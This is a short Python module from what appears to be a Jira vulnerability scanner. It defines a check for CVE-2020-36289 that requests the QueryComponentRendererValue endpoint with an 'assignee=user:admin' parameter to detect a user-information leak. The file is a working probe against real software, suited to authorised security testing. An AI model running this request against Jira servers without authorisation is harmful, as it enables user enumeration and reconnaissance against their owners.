#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.enums import Severity


class CVE202036289(Exploit):
    cve = "CVE-2020-36289"
    severity = Severity.MEDIUM
    description = "QueryComponentRendererValue disclosure"

    def check(self) -> bool:
        r = self.client.get(
            f"{self.target}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin"
        )
        return r.status_code == 200 and "assignee" in r.text.lower()

    def exploit(self) -> None:
        print("[*] QueryComponentRendererValue leaks user information")
